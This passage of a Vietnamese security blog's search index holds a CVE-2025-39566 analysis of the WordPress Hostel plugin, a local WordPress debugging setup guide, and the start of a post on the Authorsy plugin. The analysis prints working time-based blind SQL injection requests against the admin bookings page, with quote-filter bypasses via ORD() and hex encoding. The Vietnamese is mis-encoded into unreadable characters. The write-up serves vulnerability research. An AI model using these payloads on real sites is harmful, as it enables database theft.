ƒë·ªùi khi WordPress d·ª±ng Admin Dashboard Menu. Menu tr√™n UI Admin Dashboard\nDebugging\nCh·ª©c nƒÉng b·ªã l·ªói n·∫±m trong Booking Manager, v√¨ v·∫≠y ta truy c·∫≠p v√†o submenu Manager Bookings tr√™n UI Admin Dashboard. Ngay tr∆∞·ªõc nh√°nh default c√≥ comment // list bookings =\u0026gt; cho th·∫•y ƒëo·∫°n code n√†y x·ª≠ l√Ω vi·ªác li·ªát k√™ v√† s·∫Øp x·∫øp bookings M·ªü debugger: Click Run with Debugger. ƒê·∫∑t breakpoint t·∫°i nh√°nh switch ch·ª©a code l·ªói v√† t·∫°i d√≤ng code g√¢y l·ªói. Khi click v√†o m·ªôt c·ªôt trong b·∫£ng bookings, quan s√°t: Debugger nh·∫£y v√†o c·∫•u tr√∫c switch. D√πng Step Over, debugger ƒëi ti·∫øp v√†o nh√°nh default. Ti·∫øp t·ª•c Step Over v√† theo d√µi gi√° tr·ªã bi·∫øn trong tab Variables \u0026gt; Locals. C√°c bi·∫øn n√†y s·∫Ω k·∫øt h·ª£p ƒë·ªÉ t·∫°o th√†nh c√¢u SQL b√™n d∆∞·ªõi. Sau khi gh√©p c√°c bi·∫øn, c√¢u query ƒë·∫ßy ƒë·ªß c√≥ d·∫°ng:\nSELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM wp_hostel_bookings tB JOIN wp_hostel_rooms tR ON tR.id = tB.room_id WHERE is_static=0 AND tB.id = ... ORDER BY tB.amount_paid ASC|DESC LIMIT ... ƒê√°ng ch√∫ √Ω, bi·∫øn $orderby ƒë∆∞·ª£c g√°n nh∆∞ sau:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } ‚ö†Ô∏è ·ªû ƒë√¢y c√≥ ƒëi·ªÉm b·∫•t th∆∞·ªùng:\nPh·∫ßn sau ORDER BY s·ª≠ d·ª•ng sanitize_text_field(). H√†m n√†y ch·ªâ l√†m s·∫°ch HTML, kh√¥ng h·ªÅ filter ho·∫∑c validate ƒë·ªÉ ƒë·∫£m b·∫£o an to√†n trong SQL context. Tham s·ªë ob (do ng∆∞·ªùi d√πng truy·ªÅn v√†o) v√¨ v·∫≠y c√≥ th·ªÉ b·ªã l·ª£i d·ª•ng ƒë·ªÉ ch√®n tr·ª±c ti·∫øp v√†o c√¢u SQL. Exploit Detect SQLi Request with BurpSuite:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=upcoming\u0026amp;ob=tB.status,(SELECT+SLEEP(10))\u0026amp;dir=ASC HTTP/1.1 Ta t√°ch m·ªánh ƒë·ªÅ ORDER BY b·∫±ng , v√¨ n√≥ ch·∫•p nh·∫≠p multi column\nK·∫øt qu·∫£: th·ªùi gian ph·∫£n h·ªìi b·ªã delay =\u0026gt; SQL Injection th√†nh c√¥ng.\nDump Data from Database Bypass ' using ORD():\nƒê·ªÉ dump d·ªØ li·ªáu c·ªßa database ta c·∫ßn th·ª≠ ƒë·ªÉ l·∫•y k√Ω t·ª± ƒë·∫ßu ti√™n c·ªßa database name.\nDo sanitize_text_field() lo·∫°i b·ªè ', ta kh√¥ng d√πng ƒë∆∞·ª£c payload so s√°nh tr·ª±c ti·∫øp. Thay v√†o ƒë√≥ d√πng ORD() ƒë·ªÉ so s√°nh k√Ω t·ª± theo ASCII:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(ORD(SUBSTRING(DATABASE(),1,1))=119,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 Th√†nh c√¥ng bypass =\u0026gt; c√≥ th·ªÉ tr√≠ch xu·∫•t t√™n database.\nBypass ' using Hex encoding (extend)\nNgo√†i ORD() ta c√≥ th·ªÉ s·ª≠ d·ª•ng Hex encoding ƒë·ªÉ bypass\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 Th√†nh c√¥ng bypass =\u0026gt; c√≥ th·ªÉ tr√≠ch xu·∫•t t√™n database.\nConclusion L·ªó h·ªïng CVE-2025-39566 trong plugin WordPress Hostel tr∆∞·ªõc phi√™n b·∫£n 1.1.5.7, xu·∫•t ph√°t t·ª´ vi·ªác truy·ªÅn tr·ª±c ti·∫øp input t·ª´ ng∆∞·ªùi d√πng v√†o SQL query m√† kh√¥ng c√≥ bi·ªán ph√°p ki·ªÉm so√°t ch·∫∑t ch·∫Ω d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection.\nKey takeaways:\nsanitize_text_field() ‚â† ch·ªëng SQL Injection C·∫ßn ph√¢n bi·ªát r√µ: l·ªçc input cho HTML vs cho SQL References SQL Injection Cheat Sheet ‚Äì PortSwigger\nWordPress Hostel Plugin \u0026lt;= 1.1.5.6 is vulnerable to SQL Injection - patchstack\n","permalink":"//localhost:1313/vi/posts/2025-09-21-cve-2025-39566/","summary":"\u003cp\u003eL·ªó h·ªïng trong plugin \u003cstrong\u003eHostel\u003c/strong\u003e tr∆∞·ªõc phi√™n b·∫£n \u003cstrong\u003e1.1.5.7\u003c/strong\u003e. Do vi·ªác l√†m s·∫°ch d·ªØ li·ªáu kh√¥ng ƒë√∫ng c√°ch, ƒëi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-39566\"\u003eCVE-2025-39566\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/hostel/\"\u003eWordPress Hostel Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 1.1.5.6\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: 7.6 (High)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Administrator\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/blog/posts/2025-09-20-wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eHostel Plugin\u003c/strong\u003e:  v1.1.5.6(vul) v√† v1.1.5.7(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th√°y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eNguy√™n nh√¢n c·ªë l√µi do ·ª©ng d·ª•ng ch√®n tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ \u003cstrong\u003eGET\u003c/strong\u003e request v√†o SQL query m√† c∆° ch·∫ø ki·ªÉm so√°t kh√¥ng ch·∫∑t ch·∫Ω.\u003c/p\u003e","title":"CVE-2025-39566 Analysis \u0026 POC"},{"content":"WordPress l√† m·ªôt h·ªá th·ªëng qu·∫£n l√Ω n·ªôi dung (CMS) m·∫°nh m·∫Ω v√† ph·ªï bi·∫øn nh·∫•t cho ph√©p b·∫°n t·∫°o, qu·∫£n l√Ω v√† t√πy ch·ªânh c√°c trang web v√† blog m·ªôt c√°ch d·ªÖ d√†ng. N√≥ l√† open-source CMS, ƒë∆∞·ª£c x√¢y d·ª±ng tr√™n PHP v√† s·ª≠ d·ª•ng c∆° s·ªü d·ªØ li·ªáu MySQL ho·∫∑c Maria DB.\nRa ƒë·ªùi nƒÉm 2003, ban ƒë·∫ßu ch·ªâ ƒë·ªÉ vi·∫øt blog, sau ƒë√≥ ph√°t tri·ªÉn th√†nh n·ªÅn t·∫£ng t·∫°o website, c·ª≠a h√†ng online, di·ªÖn ƒë√†n, landing page‚Ä¶ Hi·ªán nay, h∆°n 40% website tr√™n th·∫ø gi·ªõi ch·∫°y b·∫±ng WordPress. C√≥ 2 phi√™n b·∫£n WordPress:\nWordPress.com D·ªãch v·ª• hosting do Automattic cung c·∫•p B·∫°n ch·ªâ c·∫ßn ƒëƒÉng k√Ω t√†i kho·∫£n, kh√¥ng ph·∫£i c√†i ƒë·∫∑t H·∫°n ch·∫ø t√πy ch·ªânh, mu·ªën n√¢ng cao th√¨ ph·∫£i tr·∫£ ph√≠ WordPress.org M√£ ngu·ªìn m·ªü, b·∫°n t·ª± t·∫£i v·ªÅ v√† c√†i ƒë·∫∑t l√™n hosting/server ri√™ng T√πy ch·ªânh to√†n di·ªán, c√≥ th·ªÉ c√†i plugin, theme, vi·∫øt code, t·∫°o website theo √Ω m√¨nh Ecosystem Core: CMS ch√≠nh Plugin: M·ªôt ph·∫ßn m·ªÅm b·ªï sung c√≥ th·ªÉ ƒë∆∞·ª£c c√†i ƒë·∫∑t tr√™n trang web WordPress ƒë·ªÉ m·ªü r·ªông ch·ª©c nƒÉng c·ªßa n√≥ v√† th√™m c√°c t√≠nh nƒÉng m·ªõi Themes: M·ªôt ph·∫ßn m·ªÅm b·ªï sung ƒë·∫°i di·ªán cho s·ª± xu·∫•t hi·ªán tr·ª±c quan v√† b·ªë c·ª•c c·ªßa m·ªôt trang web WordPress Why WordPress Hacking? State of WordPress Security in 2024\nMost Popular Hi·ªán t·∫°i h∆°n 40% website tr√™n to√†n th·∫ø gi·ªõi ch·∫°y WordPress Nghƒ©a l√† hacker ch·ªâ c·∫ßn t√¨m ra m·ªôt l·ªó h·ªïng ph·ªï bi·∫øn =\u0026gt; c√≥ th·ªÉ khai th√°c h√†ng tri·ªáu site c√πng l√∫c Gi·ªëng nh∆∞ ‚Äúc√° nhi·ªÅu th√¨ ch√†i ·ªü ƒë√≥‚Äù Plugin and Theme WordPress Core ƒë√£ ƒë∆∞·ª£c xem x√©t trong 1 th·ªùi gian d√†i b·ªüi h√†ng ng√†n developers v√† researchers. K·∫øt qu·∫£ l√† r·∫•t kh√≥ ƒë·ªÉ k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ ƒë·ªôt nh·∫≠p v√†o Tuy nhi√™n, c√≥ h√†ng ch·ª•c ng√†n plugin v√† theme t·ª´ nhi·ªÅu ngu·ªìn, ch·∫•t l∆∞·ª£ng kh√¥ng ƒë·ªìng ƒë·ªÅu ƒë∆∞·ª£c s·ª≠ d·ª•ng Nhi·ªÅu plugin code b·∫£o m·∫≠t k√©m, kh√¥ng c√≤n ƒë∆∞·ª£c c·∫≠p nh·∫≠t. Hacker ch·ªâ c·∫ßn scan plugin/theme ƒë·ªÉ t√¨m version l·ªói th·ªùi, r·ªìi khai th√°c Setup WordPress for Hacking C√≥ r·∫•t nhi·ªÅu c√°ch ƒë·ªÉ setup WorkPress, t√¨m ki·∫øm b·∫±ng Google c√≥ th·ªÉ cung c·∫•p nhi·ªÅu b√†i vi·∫øt v·ªÅ n√≥. ·ªû ƒë√¢y t√¥i s·∫Ω setup tr√™n m√°y ·∫£o Ubuntu (22.04):\nKh√¥ng ·∫£nh h∆∞·ªüng ƒë·∫øn c√°c d·ªãch v·ª• c·ªßa m√°y th·∫≠t WordPress t∆∞∆°ng ƒë·ªëi nh·∫π ƒë·ªÉ s·ª≠ d·ª•ng tr√™n m√°y ·∫£o Install and configure WordPress Install Dependencies C√†i to√†n b·ªô stack c·∫ßn thi·∫øt ƒë·ªÉ ch·∫°y WordPress (web server + database + PHP + c√°c extension quan tr·ªçng).\nsudo apt install apache2 \\ ghostscript \\ libapache2-mod-php \\ mysql-server \\ php \\ php-bcmath \\ php-curl \\ php-imagick \\ php-intl \\ php-json \\ php-mbstring \\ php-mysql \\ php-xml \\ php-zip Install WordPress T·∫£i v√† c√†i m√£ ngu·ªìn WordPress v√†o th∆∞ m·ª•c web.\n# T·∫°o folder ƒë·ªÉ l∆∞u tr·ªØ m√£ ngu·ªìn website sudo mkdir -p /srv/www # ƒê·ªïi owner th√†nh www-data, ƒë√¢y l√† user m·∫∑c ƒë·ªãnh c·ªßa Apache/Nginx ƒë·ªÉ ch·∫°y web server # Khi Apache/NGINX kh·ªüi ƒë·ªông, n√≥ kh√¥ng ch·∫°y b·∫±ng root (nguy hi·ªÉm v√¨ c√≥ to√†n quy·ªÅn h·ªá th·ªëng), m√† s·∫Ω drop xu·ªëng ch·∫°y d∆∞·ªõi quy·ªÅn www-data. sudo chown www-data: /srv/www # T·∫£i g√≥i WordPress m·ªõi nh·∫•t t·ª´ trang ch√≠nh th·ª©c # Gi·∫£i n√©n vao th∆∞c m·ª•c /srv/www ƒë∆∞·ª£c t·∫°o ·ªü tr√™n curl https://wordpress.org/latest.tar.gz | sudo -u www-data tar zx -C /srv/www C√≥ th·ªÉ t·∫£i phi√™n b·∫£n c·ª• th·ªÉ b·∫±ng:\ncurl https://wordpress.org/wordpress-6.6.2.tar.gz | sudo -u www-data tar zx -C /srv/www C√†i t·ª´ wordpress.org l√† c√°ch chu·∫©n nh·∫•t v√† √≠t r·ªßi ro:\nUbuntu c√≥ s·∫µn package wordpress trong repo. Nh∆∞ng n√≥ th∆∞·ªùng c≈© h∆°n nhi·ªÅu so v·ªõi b·∫£n ch√≠nh th·ª©c tr√™n wordpress.org C·ªông ƒë·ªìng WordPress ch·ªâ h·ªó tr·ª£ khi b·∫°n d√πng b·∫£n ch√≠nh th·ª©c t·ª´ wordpress.org, v√¨ n·∫øu b·∫°n g·∫∑p l·ªói do package c·ªßa Ubuntu th√¨ h·ªç kh√¥ng gi·∫£i quy·∫øt ƒë∆∞·ª£c. Configure Apache for WordPress T·∫°o file /etc/apache2/sites-available/wordpress.conf c·∫•u h√¨nh Apache cho WordPress:\n# L·∫Øng nghe tr√™n t·∫•t c·∫£ ƒë·ªãa ch·ªâ IP (*) t·∫°i port 80 (HTTP). \u0026lt;VirtualHost *:80\u0026gt; # Th∆∞ m·ª•c g·ªëc c·ªßa website (n∆°i ch·ª©a m√£ ngu·ªìn WordPress). DocumentRoot /srv/www/wordpress \u0026lt;Directory /srv/www/wordpress\u0026gt; Options FollowSymLinks # Cho ph√©p file .htaccess ghi ƒë√® m·ªôt s·ªë thi·∫øt l·∫≠p li√™n quan ƒë·∫øn b·∫£o m·∫≠t v√† URL rewriting. AllowOverride Limit Options FileInfo # Khi truy c·∫≠p th∆∞ m·ª•c, Apache s·∫Ω t√¨m file index.php ƒë·ªÉ hi·ªÉn th·ªã. DirectoryIndex index.php # Cho ph√©p t·∫•t c·∫£ m·ªçi ng∆∞·ªùi truy c·∫≠p (c·∫ßn cho website public). Require all granted \u0026lt;/Directory\u0026gt; # Ri√™ng th∆∞ m·ª•c wp-content (ch·ª©a plugin, theme, upload) c≈©ng cho ph√©p truy c·∫≠p. \u0026lt;Directory /srv/www/wordpress/wp-content\u0026gt; Options FollowSymLinks Require all granted \u0026lt;/Directory\u0026gt; \u0026lt;/VirtualHost\u0026gt; K√≠ch ho·∫°t site WordPress:\nsudo a2ensite wordpress a2ensite = enable site config (t·∫°o symlink t·ª´ /etc/apache2/sites-available/wordpress.conf sang /etc/apache2/sites-enabled/) Sau ƒë√≥ site wordpress s·∫Ω ƒë∆∞·ª£c Apache load khi restart. K√≠ch ho·∫°t module rewrite:\nsudo a2enmod rewrite WordPress c·∫ßn module mod_rewrite ƒë·ªÉ h·ªó tr·ª£ Pretty Permalinks (v√≠ d·ª• /blog/hello-world/ thay v√¨ ?p=123) V√¥ hi·ªáu h√≥a site m·∫∑c ƒë·ªãnh (Option):\nsudo a2dissite 000-default Apache m·∫∑c ƒë·ªãnh c√≥ site 000-default.conf (ch·ªâ hi·ªÉn th·ªã \u0026ldquo;It works!\u0026rdquo;) N·∫øu kh√¥ng disable, site m·∫∑c ƒë·ªãnh c√≥ th·ªÉ chi·∫øm port 80 tr∆∞·ªõc WordPress üëâ Ho·∫∑c n·∫øu kh√¥ng mu·ªën disable, c√≥ th·ªÉ th√™m ServerName v√†o VirtualHost WordPress ƒë·ªÉ Apache ph√¢n bi·ªát domain.\n\u0026lt;VirtualHost *:80\u0026gt; ServerName mywordpress.local DocumentRoot /srv/www/wordpress ... \u0026lt;/VirtualHost\u0026gt; Mu·ªën ch·∫°y ƒë∆∞·ª£c th√¨ ph·∫£i c·∫•u h√¨nh DNS ho·∫∑c s·ª≠a file hosts:\nLinux/Mac: /etc/hosts Windows: C:\\Windows\\System32\\drivers\\etc\\hosts Reload Apache:\nsudo service apache2 reload T·∫£i l·∫°i c·∫•u h√¨nh m·ªõi m√† kh√¥ng c·∫ßn d·ª´ng server Configure database WordPress c·∫ßn m·ªôt c∆° s·ªü d·ªØ li·ªáu (MySQL/MariaDB) ƒë·ªÉ l∆∞u:\nB√†i vi·∫øt, trang, menu Ng∆∞·ªùi d√πng, m·∫≠t kh·∫©u (hash) C·∫•u h√¨nh site Plugins, themes settings M·ªü MySQL v·ªõi quy·ªÅn root:\nsudo mysql -u root C·∫•u h√¨nh MySQL:\n-- T·∫°o database wordpress mysql\u0026gt; CREATE DATABASE wordpress; Query OK, 1 row affected (0,00 sec) -- T·∫°o user ri√™ng cho wordpress mysql\u0026gt; CREATE USER wordpress@localhost IDENTIFIED BY \u0026#39;\u0026lt;your-password\u0026gt;\u0026#39;; Query OK, 1 row affected (0,00 sec) -- C·∫•p quy·ªÅn cho user WordPress mysql\u0026gt; GRANT SELECT,INSERT,UPDATE,DELETE,CREATE,DROP,ALTER ON wordpress.* TO wordpress@localhost; Query OK, 1 row affected (0,00 sec) -- L√†m m·ªõi l·∫°i quy·ªÅn mysql\u0026gt; FLUSH PRIVILEGES; Query OK, 1 row affected (0,00 sec) -- Tho√°t mysql\u0026gt; quit Bye Kh·ªüi ƒë·ªông l·∫°i d·ªãch v·ª•:\nsudo service mysql start Configure WordPress to connect to the database Copy file c·∫•u h√¨nh m·∫´u:\nsudo -u www-data cp /srv/www/wordpress/wp-config-sample.php /srv/www/wordpress/wp-config.php WordPress khi t·∫£i v·ªÅ c√≥ s·∫µn file wp-config-sample.php B·∫°n copy n√≥ th√†nh wp-config.php ƒë·ªÉ l√†m file c·∫•u h√¨nh ch√≠nh cho site Ch·ªânh s·ª≠a th√¥ng tin database:\nsudo -u www-data sed -i \u0026#39;s/database_name_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/username_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/password_here/\u0026lt;your-password\u0026gt;/\u0026#39; /srv/www/wordpress/wp-config.php ƒê√¢y l√† 3 d√≤ng thay th·∫ø text trong file wp-config.php: database_name_here =\u0026gt; wordpress (t√™n DB ƒë√£ t·∫°o ·ªü b∆∞·ªõc tr∆∞·ªõc) username_here =\u0026gt; wordpress (user MySQL ƒë√£ t·∫°o) password_here =\u0026gt; \u0026lt;your-password\u0026gt; (password ƒë√£ set) Khi Apache ch·∫°y WordPress, n√≥ s·∫Ω ƒë·ªçc file n√†y ƒë·ªÉ bi·∫øt d√πng user n√†o + DB n√†o ƒë·ªÉ k·∫øt n·ªëi MySQL Th√™m Secret Keys v√† Salts:\nsudo -u www-data nano /srv/www/wordpress/wp-config.php üëâ ƒê√¢y l√† chu·ªói b√≠ m·∫≠t m√† WordPress d√πng ƒë·ªÉ:\nM√£ h√≥a session cookies Sinh ra token (nonce) ch·ªëng CSRF NgƒÉn ch·∫∑n t·∫•n c√¥ng ki·ªÉu ‚Äúknown secret‚Äù (v√≠ d·ª• k·∫ª t·∫•n c√¥ng ƒëo√°n ƒë∆∞·ª£c secret m·∫∑c ƒë·ªãnh ƒë·ªÉ gi·∫£ m·∫°o login) define( \u0026#39;AUTH_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;SECURE_AUTH_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;LOGGED_IN_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;NONCE_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;AUTH_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;SECURE_AUTH_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;LOGGED_IN_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;NONCE_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); Thay ƒë·ªïi n√≥ b·∫±ng c√°c chu·ªói random sau: https://api.wordpress.org/secret-key/1.1/salt/\nConfigure WordPress Truy c·∫≠p http://localhost, ƒë·∫∑t site title, username, password, email cho user admin\nSetup Debug on VSCode ƒê·ªÉ hi·ªÉu ƒë∆∞·ª£c lu·ªìng c·ªßa trang web ch·∫°y v√† x·ª≠ l√≠ ·ªü m·ªói request, ta c·∫ßn ph·∫£i debug n√≥.\nAdd PHP Debug extension on VS Code V√†o Extensions (Ctrl+Shift+X) =\u0026gt; t√¨m PHP Debug (by Felix Becker) =\u0026gt; Install. Extension n√†y k·∫øt n·ªëi v·ªõi Xdebug.\nInstall Xdebug on Ubuntu sudo apt install php-xdebug -y Ki·ªÉm tra c√†i ch∆∞a:\nphp -v N·∫øu c√≥ d√≤ng with Xdebug v3.x.x nghƒ©a l√† ƒë√£ OK.\nConfigure Xdebug sudo nano /etc/php/\u0026lt;version\u0026gt;/apache2/php.ini Th√™m v√†o cu·ªëi file\nzend_extension=xdebug.so xdebug.mode=debug xdebug.start_with_request=yes xdebug.client_host=127.0.0.1 xdebug.client_port=9003 Port m·∫∑c ƒë·ªãnh m·ªõi c·ªßa Xdebug v3 l√† 9003.\nSau ƒë√≥ restart Apache:\nsudo systemctl restart apache2 Configure VSCode launch.json M·ªü th∆∞ m·ª•c ch·ª©a trang web wordpress b·∫±ng VSCode\ncode /srv/www/wordpress Trong VS Code =\u0026gt; Run and Debug (Ctrl+Shift+D) =\u0026gt; t·∫°o file launch.json v·ªõi n·ªôi dung:\n{ \u0026#34;version\u0026#34;: \u0026#34;0.2.0\u0026#34;, \u0026#34;configurations\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;Listen for Xdebug\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;php\u0026#34;, \u0026#34;request\u0026#34;: \u0026#34;launch\u0026#34;, \u0026#34;port\u0026#34;: 9003, \u0026#34;pathMappings\u0026#34;: { \u0026#34;/srv/www/wordpress\u0026#34;: \u0026#34;${workspaceFolder}\u0026#34; } } ] } pathMappings: √°nh x·∫° th∆∞ m·ª•c trong container/server (/srv/www/wordpress) v·ªÅ th∆∞ m·ª•c local c·ªßa trong VS Code.\nNh∆∞ v·∫≠y l√† ƒë√£ ho√†n th√†nh setup WordPress tr√™n local k·∫øt h·ª£p Debug n√≥ tr√™n VSCode.\nExtend Required Version M·ªói phi√™n b·∫£n WordPress th∆∞·ªùng ƒëi k√®m 1 phi√™n b·∫£n PHP th√≠ch h·ª£p. N√™n ki·ªÉm tra t√≠nh t∆∞∆°ng th√≠ch n√†y ƒë·ªÉ qu√° tr√¨nh setup kh√¥ng b·ªã l·ªói.\nWordPress Auto Update T·ª´ WordPress 3.7 tr·ªü ƒëi (2013), WordPress c√≥ c∆° ch·∫ø t·ª± ƒë·ªông c·∫≠p nh·∫≠t (automatic background updates) cho:\nB·∫£n v√° b·∫£o m·∫≠t (security release). B·∫£n b·∫£o tr√¨ (maintenance release). Kh√¥ng t·ª± ƒë·ªông update major version (tr·ª´ khi b·∫≠t r√µ r√†ng). H·ªá th·ªëng ki·ªÉm tra v·ªõi server api.wordpress.org ƒë·ªÉ xem c√≥ b·∫£n v√° n√†o m·ªõi s·∫Ω t·ª± ƒë·ªông n√¢ng c·∫•p background l√™n. Vi·ªác n√†y di·ªÖn ra r·∫•t nhanh sau khi setup, n√™n b·∫°n th·∫•y code ƒë·ªïi kh√°c so v·ªõi source g·ªëc.\nQu√° tr√¨nh setup di·ªÖn ra khi truy c·∫≠p /wp-admin/install.php\nƒê·ªÉ v√¥ hi·ªáu h√≥a c∆° ch·∫ø c·∫≠p nh·∫≠t t·ª± ƒë·ªông n√†y, th√™m d√≤ng sau v√†o wp-config.php:\ndefine( \u0026#39;WP_AUTO_UPDATE_CORE\u0026#39;, false ); Increase Uploadable Plugin Size M·∫∑c ƒë·ªãnh, WordPress ph·ª• thu·ªôc v√†o c·∫•u h√¨nh PHP (upload_max_filesize, post_max_size, v√† ƒë√¥i khi c·∫£ max_execution_time) ƒë·ªÉ x√°c ƒë·ªãnh dung l∆∞·ª£ng file t·ªëi ƒëa c√≥ th·ªÉ upload. Tr√™n nhi·ªÅu hosting, gi·ªõi h·∫°n n√†y ch·ªâ kho·∫£ng 2MB ‚Äì 8MB, kh√¥ng ƒë·ªß cho c√°c plugin hi·ªán ƒë·∫°i.\nWhy Increase the Limit? Plugin dung l∆∞·ª£ng l·ªõn: C√°c plugin nh∆∞ WooCommerce extension, page builder, backup, ho·∫∑c security suite c√≥ th·ªÉ n·∫∑ng 20MB ‚Äì 100MB.\nTr√°nh l·ªói upload: N·∫øu file .zip l·ªõn h∆°n gi·ªõi h·∫°n, b·∫°n s·∫Ω g·∫∑p l·ªói:\n‚ÄúThe uploaded file exceeds the upload_max_filesize directive in php.ini‚Äù Ho·∫∑c upload th·∫•t b·∫°i. Thu·∫≠n ti·ªán cho qu·∫£n tr·ªã vi√™n: C√≥ th·ªÉ c√†i tr·ª±c ti·∫øp qua Dashboard m√† kh√¥ng c·∫ßn FTP/SSH.\nH·ªó tr·ª£ ph√°t tri·ªÉn plugin: Plugin t·ª± vi·∫øt k√®m nhi·ªÅu th∆∞ vi·ªán/asset c√≥ th·ªÉ kh√° n·∫∑ng, vi·ªác tƒÉng gi·ªõi h·∫°n gi√∫p test d·ªÖ d√†ng h∆°n.\nHow to Increase Plugin Upload Size S·ª≠a php.ini (n·∫øu c√≥ quy·ªÅn server):\nupload_max_filesize = 64M post_max_size = 64M max_execution_time = 300 S·ª≠a file .htaccess (n·∫øu d√πng Apache):\nphp_value upload_max_filesize 64M php_value post_max_size 64M php_value max_execution_time 300 php_value max_input_time 300 Th√™m v√†o wp-config.php:\n@ini_set( \u0026#39;upload_max_filesize\u0026#39; , \u0026#39;64M\u0026#39; ); @ini_set( \u0026#39;post_max_size\u0026#39;, \u0026#39;64M\u0026#39;); @ini_set( \u0026#39;max_execution_time\u0026#39;, \u0026#39;300\u0026#39; ); üëâ L·ªùi khuy√™n: Ch·ªâ n√™n ƒë·∫∑t gi·ªõi h·∫°n v·ª´a ƒë·ªß (64MB ho·∫∑c 128MB). Tr√°nh ƒë·∫∑t qu√° l·ªõn ƒë·ªÉ h·∫°n ch·∫ø nguy c∆° b·ªã upload file n·∫∑ng g√¢y qu√° t·∫£i server.\n","permalink":"//localhost:1313/vi/posts/2025-09-20-wordpress-local-and-debugging/","summary":"\u003cp\u003e\u003cstrong\u003eWordPress\u003c/strong\u003e l√† m·ªôt h·ªá th·ªëng qu·∫£n l√Ω n·ªôi dung (CMS) m·∫°nh m·∫Ω v√† ph·ªï bi·∫øn nh·∫•t cho ph√©p b·∫°n t·∫°o, qu·∫£n l√Ω v√† t√πy ch·ªânh c√°c trang web v√† blog m·ªôt c√°ch d·ªÖ d√†ng. N√≥ l√† open-source CMS, ƒë∆∞·ª£c x√¢y d·ª±ng tr√™n PHP v√† s·ª≠ d·ª•ng c∆° s·ªü d·ªØ li·ªáu MySQL ho·∫∑c Maria DB.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eRa ƒë·ªùi nƒÉm 2003, ban ƒë·∫ßu ch·ªâ ƒë·ªÉ vi·∫øt blog, sau ƒë√≥ ph√°t tri·ªÉn th√†nh n·ªÅn t·∫£ng t·∫°o website, c·ª≠a h√†ng online, di·ªÖn ƒë√†n, landing page‚Ä¶\u003c/li\u003e\n\u003cli\u003eHi·ªán nay, h∆°n 40% website tr√™n th·∫ø gi·ªõi ch·∫°y b·∫±ng WordPress.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eC√≥ 2 phi√™n b·∫£n WordPress:\u003c/p\u003e","title":"WordPress Local and Debugging"},{"content":"Introduction L·ªó h·ªïng x·∫£y ra tr√™n plugin Authorsy c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n 1.0.6. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng ch√®n m√£ ƒë·ªôc (v√≠ d·ª•: script chuy·ªÉn h∆∞·ªõng, qu·∫£ng c√°o, ho·∫∑c c√°c payload HTML kh√°c) v√†o website, v√† 